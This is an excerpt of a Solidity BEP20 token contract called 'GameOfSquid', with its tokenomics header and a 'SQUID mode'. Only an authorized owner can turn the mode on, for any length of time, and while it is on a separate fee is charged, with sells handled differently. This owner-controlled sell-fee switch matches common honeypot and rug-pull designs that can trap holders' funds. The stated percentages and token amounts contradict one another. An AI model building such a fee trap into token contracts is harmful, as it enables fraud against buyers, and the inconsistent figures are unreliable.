...
Tokenomics
    💵 1.0% Max Buy Tx ( 1,000,000 )
    💵 0.20% Max Sell Tx ( 250,000 )
...
/* Token contract */
contract GameOfSquid is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    // Name and symbol
    string constant _name = "GameOfSquid";
    ...
    uint256 public _maxSellTxAmount = _totalSupply * 10 / 10000; // 0.20% or 250k tokens
    ...
    // SQUID
    uint256 SQUIDTriggeredAt;
    uint256 SQUIDDuration = 3600;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        // Check if we are in SQUIDTime
        bool SQUIDMode = inSQUIDTime();
        ...
        uint256 amountReceived = shouldTakeFee(sender) ? takeFee(sender, amount, isSell, SQUIDMode) : amount;
    ...
    // Check if we are in SQUID time
    function inSQUIDTime() public view returns (bool){
        if(SQUIDTriggeredAt.add(SQUIDDuration) > block.timestamp){
            return true;
        } else {
            return false;
        }
    ...
    // Take the normal total Fee or the SQUID Fee
    function takeFee(address sender, uint256 amount, bool isSell, bool SQUIDMode) internal returns (uint256) {
        uint256 feeAmount;
        
        // Check if we are SQUIDd
        if (SQUIDMode){
            if(isSell){
    ...
    // Enable SQUID
    function enableSQUID(uint256 _seconds) public authorized {
        SQUIDTriggeredAt = block.timestamp;
        SQUIDDuration = _seconds;
    }

    // Disable the SQUID mode
    function disableSQUID() external authorized {
        SQUIDTriggeredAt = 0;
    }
